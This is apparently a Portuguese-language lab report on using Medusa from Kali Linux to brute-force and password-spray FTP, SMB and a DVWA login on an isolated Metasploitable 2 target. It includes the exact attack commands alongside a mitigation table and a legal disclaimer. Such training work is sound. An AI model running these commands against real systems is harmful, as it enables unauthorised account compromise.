# 🛡️ Relatório de Auditoria de Segurança: Ataques de Força Bruta com Medusa

Este repositório documenta a implementação prática de ataques de força bruta e *password spraying* em um ambiente controlado, utilizando o **Kali Linux** e a ferramenta **Medusa**. O objetivo é simular cenários reais de intrusão para validar vulnerabilidades e propor medidas de mitigação eficazes.

---

## 🏗️ Cenário do Laboratório

O ambiente foi configurado em uma rede isolada (**Host-Only**) no VirtualBox para garantir a segurança e conformidade dos testes.

* **Atacante:** Kali Linux | IP: `192.168.56.101`
* **Alvo:** Metasploitable 2 | IP: `192.168.56.102`
* **Serviços Auditados:** FTP (21), SMB (445) e HTTP (DVWA).

---

## 🚀 Desenvolvimento Técnico e Comandos

### 1. SMB Password Spraying e Enumeração

Diferente do brute force tradicional, o *Password Spraying* tenta uma única senha contra vários usuários para evitar o bloqueio de contas (*Account Lockout*).

**Comando utilizado:**

```bash
medusa -h 192.168.56.102 -U smb\_users.txt -P senhas\_spray.txt -M smbnt -t 2 -T 50
```
### Validação de Acesso (Pós-Exploração)
Após identificar a credencial válida (msfadmin), confirmamos a listagem de diretórios e recursos compartilhados no servidor para validar o nível de acesso obtido:

```bash
smbclient -L //192.168.56.102 -U msfadmin
```
### 2. Força Bruta em Formulário Web (DVWA)
O desafio técnico aqui foi mapear os campos do formulário de login do DVWA (nível Low) e definir a string de erro para que o Medusa identifique o sucesso.

**Comando utilizado:**
```bash
medusa -h 192.168.56.102 -u admin -P pass.txt -M http \\
-m PAGE:'/dvwa/login.php' \\
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \\
-m 'FAIL=Login failed' -t 6
```

### 3. Brute Force FTP
Simulação de ataque direto ao protocolo de transferência de arquivos para testar a robustez das credenciais de serviço padrão.

**Comando utilizado:**
```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp
```
---

### 📂 Estrutura de Evidências e Artefatos
Todos os registros visuais das execuções bem-sucedidas e logs de saída foram organizados no diretório /images.

---
## 🛡️ Plano de Mitigação (Recomendações de Segurança)

Como resultado desta auditoria, as seguintes contramedidas são recomendadas para fortalecer o ambiente:

| Serviço | Vulnerabilidade | Medida de Mitigação |
|---------|-----------------|-------------------|
| Geral | Senhas Fracas | Implementar Política de Senhas (mínimo 12 caracteres, complexidade). |
| FTP/SMB | Brute Force | Configurar o Fail2Ban para bloquear IPs após 3 tentativas falhas. |
| SMB | Enumeração | Desativar o protocolo SMBv1 e restringir acesso via Firewall. |
| Web (Login) | Automatização | Implementar CAPTCHA, MFA (Múltiplo Fator) e bloqueio temporário de conta. |

---

## ⚠️ Aviso Legal
Este projeto possui fins estritamente educativos e foi realizado em ambiente controlado. O uso destas técnicas em sistemas sem autorização expressa é ilegal e antiético.

---
## 🎓 Conclusão e Aprendizado

Este desafio prático demonstrou a criticidade de implementar **políticas robustas de autenticação** em ambientes corporativos. O Medusa evidenciou como serviços podem ser rapidamente comprometidos quando dependem exclusivamente de senhas como mecanismo de defesa, ressaltando a necessidade de **camadas adicionais de segurança**.

A experiência reforça um princípio fundamental em Cybersecurity: **documentação detalhada e análise de vulnerabilidades transformam simulações de ataque em insumos valiosos para melhoria contínua**. Ao mapear riscos e propor contramedidas específicas, convertemos cenários de exploração em estratégias defensivas que fortalecem a postura de segurança organizacional.

Este projeto exemplifica como testes controlados, quando bem documentados e analisados, são ferramentas essenciais para construir infraestruturas mais resilientes e seguras.







